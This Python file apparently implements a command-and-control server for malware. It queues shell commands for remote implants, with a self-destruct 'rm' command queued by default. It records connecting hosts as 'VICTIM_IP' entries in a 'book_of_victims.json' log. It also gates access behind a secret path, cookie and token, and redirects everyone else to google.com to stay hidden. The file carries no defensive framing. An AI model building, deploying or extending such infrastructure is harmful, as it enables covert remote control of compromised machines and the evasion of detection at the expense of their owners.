from http.server import HTTPServer, BaseHTTPRequestHandler
from http.cookies import SimpleCookie
import json
from datetime import datetime
from collections import deque
from dotenv import load_dotenv
import os

SELF_DESTRUCT_COMMAND = 'rm -- "$0"'

def get_env_info():
    load_dotenv()
    PATH = os.getenv("C_PATH")
    ACCESS_TOKEN = os.getenv("ACCESS_TOKEN")
    COOKIE_VALUE = os.getenv("COOKIE_VALUE")
    return PATH, ACCESS_TOKEN, COOKIE_VALUE

class MadaraHandler(BaseHTTPRequestHandler):

    command_queue = deque()
    command_queue.append(SELF_DESTRUCT_COMMAND)

    def heart_beat(self):
        # Get the client IP and current time
        client_ip = self.client_address[0]
        connection_time = (datetime.now()).strftime("%Y-%m-%d %H:%M:%S")

        # Create a heartbeat dictionary
        beat = {"VICTIM_IP": client_ip, "TIME": connection_time}
        return beat

    def save_info(self, heart_beat):
        # Save the heartbeat to the JSON file
        try:
            with open("book_of_victims.json", "a") as j_file:
                json.dump(heart_beat, j_file, indent=4)
                j_file.write("\n")
        except Exception as e:
            print(f"An error occurred: {e}")


    def redirect(self, url, code=302):
        self.send_response(code)  # change later to 301 or 308
        self.send_header("Location", url)
        self.end_headers()

    def cookie_info(self):
        cookie_header = self.headers.get("Cookie")
        cookie = SimpleCookie(cookie_header)
        correct_cookie = cookie.get("name")
        return correct_cookie.value if correct_cookie else None

    def do_GET(self):
        PATH,ACCESS_TOKEN,COOKIE_VALUE = get_env_info()
        correct_cookie = self.cookie_info()

        if (
            self.path == PATH
            and correct_cookie == COOKIE_VALUE
            and self.headers["X-Access-Token"] == ACCESS_TOKEN
        ):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
        else:
             self.redirect("https://www.google.com")
    def do_POST(self):
        PATH, ACCESS_TOKEN, COOKIE_VALUE = get_env_info()
        correct_cookie = self.cookie_info()

        self.protocol_version = "HTTP/1.1"

        if (
            self.path == PATH
            and correct_cookie == COOKIE_VALUE
            and self.headers.get("X-Access-Token") == ACCESS_TOKEN
        ):
            content_length = int(self.headers.get("Content-Length", 0))
            command = self.rfile.read(content_length).decode("utf-8")
            self.command_queue.appendleft(command)
            print(self.command_queue)

            beat = self.heart_beat()
            self.save_info(beat)

            response_body = b"meow\n"

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(response_body)))  # <-- Add this
            self.send_header("Connection", "close")                    # <-- Recommended
            self.end_headers()

            self.wfile.write(response_body)
            self.wfile.flush()
            return
        else:
            self.redirect("https://www.google.com")
